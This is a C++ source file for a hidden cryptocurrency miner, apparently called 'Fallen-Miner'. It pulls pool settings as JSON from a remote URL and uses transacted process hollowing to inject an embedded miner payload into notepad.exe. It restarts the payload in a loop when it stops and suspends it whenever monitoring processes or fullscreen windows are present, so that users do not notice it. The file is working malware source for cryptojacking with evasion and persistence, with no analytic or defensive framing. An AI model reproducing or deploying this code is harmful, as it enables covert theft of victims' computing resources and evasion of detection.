#include <Windows.h>

#include <iostream>
#include <stdio.h>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../src/inject_core.cpp"
#include "../include/embedded_resource.h"

std::string pool_address;
int pool_threads;
int pool_idle_threads;
int pool_idle_time;
std::string pool_password;
std::string pool_pool;
int pool_ssl;

int main(int argc, char *argv[])
{
   const char* mutex = "Fallen-Miner";
    if (IsAnotherInstanceRunning(mutex)) {
        std::cerr << "Another instance is already running. Exiting." << std::endl;
        return 0;
    }


    std::wstring url = L"http";
    std::wcout << url << std::endl;

    // Single function call to fetch and print
    std::string jsonStr = fetchJsonFromUrl(url);
    if (!jsonStr.empty())
    {
        try
        {
            json jsonData = json::parse(jsonStr);
            MiningPoolData pool = extractMiningPoolData(jsonData);

            pool_address = jsonData["address"].get<std::string>();
            pool_threads = jsonData["threads"].get<int>();
            pool_idle_threads = jsonData["idle_threads"].get<int>();
            pool_idle_time = jsonData["idle_time"].get<int>();
            pool_password = jsonData["password"].get<std::string>();
            pool_pool = jsonData["pool"].get<std::string>();
            pool_ssl = jsonData["ssl"].get<int>();
        }
        catch (const json::exception &e)
        {
            std::cerr << "JSON Parse Error: " << e.what() << std::endl;
            return 1;
        }
    }
    else
    {
        return 1;
    }

    const bool is32bit = false;

    // Create mutable buffers
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";

    size_t payloadSize = 0;
    BYTE *payladBuf = nullptr;
    LoadEmbeddedExe(payladBuf, payloadSize);
    if (payladBuf == NULL)
    {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    std::string template_cmd = "--donate-level 2 -o {pool} -u {address} -k {tls} -p {password} --cpu-max-threads-hint={threads}";
    std::unordered_map<std::string, std::string> replacements;


    if (IsDeviceIdle(pool_idle_time))
    {
        replacements = {
            {"{pool}", pool_pool},
            {"{address}", pool_address},
            {"{password}", pool_password},
            {"{threads}", std::to_string(pool_idle_threads)},
            {"{tls}", (pool_ssl == 1) ? "--tls" : ""}};
    }
    else if (pool_password == "{USER}")
    {
        replacements = {
            {"{pool}", pool_pool},
            {"{address}", pool_address},
            {"{password}", GetWindowsUsername()},
            {"{threads}", std::to_string(pool_threads)},
            {"{tls}", (pool_ssl == 1) ? "--tls" : ""}};
    }
    else
    {
        replacements = {
            {"{pool}", pool_pool},
            {"{address}", pool_address},
            {"{password}", pool_password},
            {"{threads}", std::to_string(pool_threads)},
            {"{tls}", (pool_ssl == 1) ? "--tls" : ""}};
    }

    std::string final_command = buildCommandFromTemplate(template_cmd, replacements);

    DWORD pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
    free_buffer(payladBuf);
    if (pid == 0)
    {
        std::cerr << "Injection failed!\n";
        return 1;
    }

    std::cout << "Injected into PID: " << pid << "\n";

    // Later you can access the full process info:
    auto pi = ProcessStorage::GetProcess(pid);
    if (pi)
    {
        std::cout << "Process handle: " << pi->hProcess << "\n"
                  << "Thread handle: " << pi->hThread << "\n"
                  << "Main thread ID: " << pi->dwThreadId << "\n";
    }

    while (true)
    {
        if (!IsPidRunning(pid))
        {
            std::cout << "[!] Process with PID " << pid << " is NOT running." << std::endl;
            pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
            pi = ProcessStorage::GetProcess(pid);
            if (AreProcessesRunning(processNames))
            {
                std::cout << "Monitoring detected running processes! not run func\n";
                NtSuspendProcess(pi->hProcess);
            }
            else if (IsForegroundWindowFullscreen())
            {
                std::cout << "Monitoring detected fullscreen processes!\n";
                NtSuspendProcess(pi->hProcess);
            }
            else
            {
                std::cout << "No monitored processes. not run func\n";
                NtResumeProcess(pi->hProcess);
            }
        }
        else
        {
            std::cout << "[!] Process with PID " << pid << " is running :)" << std::endl;
            if (AreProcessesRunning(processNames))
            {
                std::cout << "Monitoring detected running processes! run func\n";
                NtSuspendProcess(pi->hProcess);
            }
            else if (IsForegroundWindowFullscreen())
            {
                std::cout << "Monitoring detected fullscreen processes!\n";
                NtSuspendProcess(pi->hProcess);
            }
            else
            {
                std::cout << "No monitored processes. run func\n";
                NtResumeProcess(pi->hProcess);
            }
        }
        Sleep(10000);
    }

    return 0;
}
